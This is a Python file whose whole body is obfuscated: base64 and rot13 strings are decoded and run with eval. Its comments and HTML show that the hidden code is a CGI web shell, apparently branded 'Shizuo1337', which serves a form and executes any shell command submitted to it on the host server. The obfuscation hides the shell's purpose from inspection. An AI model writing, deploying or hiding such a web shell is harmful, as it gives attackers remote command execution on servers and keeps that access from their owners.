# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'IyEvdXNyL2Jpbi9weXRob24KCiMgY2dpLXNoZWxsLnB5CiMgQSBzaW1wbGUgQ0dJIHRoYXQgZXhlY3V0ZXMgYXJiaXRyYXJ5IHNoZWxsIGNvbW1hbmRzLgoKCiMgQ29weXJpZ2h0IE1pY2hhZWwgRm9vcmQKIyBZb3UgYXJlIGZyZWUgdG8gbW9kaWZ5LCB1c2UgYW5kIHJlbGljZW5zZSB0aGlzIGNvZGUuCgojIE5vIHdhcnJhbnR5IGV4cHJlc3Mgb3IgaW1wbGllZCBmb3IgdGhlIGFjY3VyYWN5LCBmaXRuZXNzIHRvIHB1cnBvc2Ugb3Igb3RoZXJ3aXNlIGZvciB0aGlzIGNvZGUuLi4uCiMgVXNlIGF0IHlvdXIgb3duIHJpc2sgISEhCgojIEUtbWFpbCBtaWNoYWVsIEFUIGZvb3JkIERPVCBtZSBET1QgdWsKIyBNYWludGFpbmVkIGF0IHd3dy52b2lkc3BhY2Uub3JnLnVrL2F0bGFudGlib3RzL3B5dGhvbnV0aWxzLmh0bWwKCiIiIgpBIHNpbXBsZSBDR0kgc2NyaXB0IHRvIGV4ZWN1dGUgc2hlbGwgY29tbWFuZHMgdmlhIENHSS4KIiIiCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBJbXBvcnRzCnRyeToKICAgIGltcG9ydCBjZ2l0YjsgY2dpdGIuZW5hYmxlKCkKZXhjZXB0OgogICAgcGFzcwppbXBvcnQgc3lzLCBjZ2ksIG9zCnN5cy5zdGRlcnIgPSBzeXMuc3Rkb3V0CmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUKaW1wb3J0IHRyYWNlYmFjawpmcm9tIFN0cmluZ0lPIGltcG9ydCBTdHJpbmdJTwpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgY29uc3RhbnRzCgpmb250bGluZSA9ICc8Rk9OVCBDT0xPUj0jNDI0MjQyIHN0eWxlPSJmb250LWZhbWlseTp0aW1lcztmb250LXNpemU6MTJwdDsiPicKdmVyc2lvbnN0cmluZ'
love = 'lN9VPqJMKWmnJ9hVQVhZPpXPzyzVT9mYzIhqzylo24hnTSmK2gyrFtvH0AFFIOHK05OGHHvXGbXVPNtVUAwpzyjqT5uoJHtCFOipl5yoaMcpz9hJlWGD1WWHSEsGxSAEFWqPzIfp2H6PvNtVPOmL3WcpUEhLJ1yVQ0tVvVXPx1SIRuCEPN9VPpvHR9GIPVaPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwPvZtHUWcqzS0MFOzqJ5wqTyioaZtLJ5xVUMupzyuLzkypjbXMTIzVTqyqTMipz0bqzSfqJIfnKA0YPO0nTIzo3WgYPOho3EjpzImMJ50CFpaXGbXVPNtVPVvVyEbnKZtMaIhL3Eco24fVTqcqzIhVTRtD0qWVTMipz0fVTI4qUWuL3EmVUEbMFOxLKEuVTMlo20tnKDfVTWup2IxVT9hPvNtVPO2LJk1MJkcp3DtpTSmp2IxVTyhYvOOoaxtoz9hYKOlMKAyoaDtqzSfqJImVTSlMFOmMKDtqT8tWlptYFOuoUEbo3IanPO0nTymVTAuovOvMFOwnTShM2IxYtbtVPNtXTHhMl4tqT8tpzI0qKWhVR5iozHtp28trJ91VTAuovO0MKA0VTMipvOgnKAmnJ5aVTgyrKqipzEmVP0tq2uypzHtWlptnKZtLFO2LJkcMPOuoaA3MKVtLaI0VUEiVTuuqzHtqTuyVTMcMJkxVT1cp3AcozptnKAhW3DhXFVvVtbtVPNtMTS0LFN9VUg9PvNtVPOzo3VtMzyyoTDtnJ4tqzSfqJIfnKA0BtbtVPNtVPNtVTyzVT5iqPO0nTIzo3WgYzuup19eMKxbMzyyoTDcBtbtVPNtVPNtVPNtVPOxLKEuJ2McMJkxKFN9VT5iqUOlMKAyoaDXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOcMvNtqUyjMFu0nTIzo3WgJ2McMJkxKFxtVG0tqUyjMFuoKFx6PvNtVPNtVPNtVPNtVPNtVPOxLKEuJ2McMJkxKFN9VUEbMJMipz1oMzyyoTEqYaMuoUIyPvNtVPNtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVPNtVPO2LJk1MKZtCFOgLKNboTSgLzEuVUt6VUthqzSfqJHfVUEbMJMipz1oMzyyoTEqXFNtVPNtVlOuoT'
god = 'xvd3MgZm9yIGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAgICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPlNoaXp1byBQeXRob24gQ0dJPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+CjxIMT5XZWxjb21lIHRvIFB5dGhvbiBDR0k8L0gxPgo8Qj48ST5CeSBTaGl6dW8xMzM3PC9CPjwvST48QlI+CiIiIitmb250bGluZSArIlZlcnNpb24gOiAiICsgdmVyc2lvbnN0cmluZyArICIiIiwgUnVubmluZyBvbiA6ICIiIiArIHN0cmZ0aW1lKCclSTolTSAlcCwgJUEgJWQgJUIsICVZJykrJy48L0NFTlRFUj48QlI+JwoKdGhlZm9ybSA9ICIiIjxDRU5URVI+PEgyPkVudGVyIENvbW1hbmQ8L0gyPgo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+CjxpbnB1dCBuYW1lPWNtZCB0eXBlPXRleHQ+PEJSPgo8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IlN1Ym1pdCI+PEJSPgo8L0ZPUk0+PC9DRU5URVI+PEJSPjxCUj4iIiIKYm9keWVuZCA9ICc8L0JPRFk+PC9IVE1MPicKZXJyb3JtZXNzID0gJzxDRU5URVI+PEgyPlNvbWV0aGluZyBXZW50IFdyb25nPC9IMj48QlI+PFBSRT4nCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgbWFpbiBib2R5IG9mIHRoZSBzY3JpcHQKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWwiICAgICAgICAgIyB0aGlzIGlzIHRoZSBoZWFkZXIgdG8gdGhlIHNlcnZlcgogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lCiAgICBmb3J'
destiny = 'gVQ0tL2qcYxMcMJkxH3EipzSaMFtcPvNtVPOxLKEuVQ0tM2I0Mz9loFuoW2AgMPqqYTMipz0cPvNtVPO0nTIwoJDtCFOxLKEuJlqwoJDaKDbtVPNtpUWcoaDtqTuyMz9loJuyLJDXVPNtVUOlnJ50VUEbMJMipz0XVPNtVTyzVUEbMJAgMQbXVPNtVPNtVPOjpzyhqPNaCRuFCwkPHw48DyV+WjbtVPNtVPNtVUOlnJ50VPp8Dw5Qo21gLJ5xVQbtWljtqTuyL21xYPNaCRWFCwkPHw4aPvNtVPNtVPNtpUWcoaDtW1Wyp3IfqPN6VQkPHw48DyV+WjbtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtL2ucoTEsp3ExnJ4fVTAbnJkxK3A0MT91qPN9VT9mYaOipTIhZvu0nTIwoJDcPvNtVPNtVPNtVPNtVTAbnJkxK3A0MTyhYzAfo3AyXPxXVPNtVPNtVPNtVPNtpzImqJk0VQ0tL2ucoTEsp3Exo3I0YaWyLJDbXDbtVPNtVPNtVPNtVPOwnTyfMS9mqTEiqKDhL2kip2HbXDbtVPNtVPNtVPNtVPOjpzyhqPOlMKA1oUDhpzIjoTSwMFtaKT4aYPNaCRWFCvpcPtbtVPNtVPNtVTI4L2IjqPOSrTAypUEco24fVTH6VPNtVPNtVPNtVPNtVPNtVPNtVPNtVPZtLJ4tMKWlo3VtnJ4tMKuyL3I0nJ5aVUEbMFOwo21gLJ5xPvNtVPNtVPNtVPNtVUOlnJ50VTIlpz9loJImpjbtVPNtVPNtVPNtVPOzVQ0tH3ElnJ5aFH8bXDbtVPNtVPNtVPNtVPOjpzyhqS9yrTZbMzyfMG1zXDbtVPNtVPNtVPNtVPOuVQ0tMv5aMKE2LJk1MFtcYaAjoTy0oTyhMKZbXDbtVPNtVPNtVPNtVPOzo3VtoTyhMFOcovOuBtbtVPNtVPNtVPNtVPNtVPNtpUWcoaDtoTyhMDbXVPNtVUOlnJ50VTWiMUyyozDXPtbvVvVXIR9RGl9WH1AIEIZXPtbXD0uOGxqSGR9UPxRtqzIlrFOvLKAcLlOmrKA0MJ0tMz9lVTI4MJA1qTyhMlOmnTIfoPOwo21gLJ5xpl4XFFOgLKxtMKujLJ5xVTy0VTyhqT8tLFOjpz9jMKVtW2Ihqzylo25gMJ50WlO3nKEbVUAyp3Aco24tpTIlp2ymqTIhL2HhYv4XVvVvPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))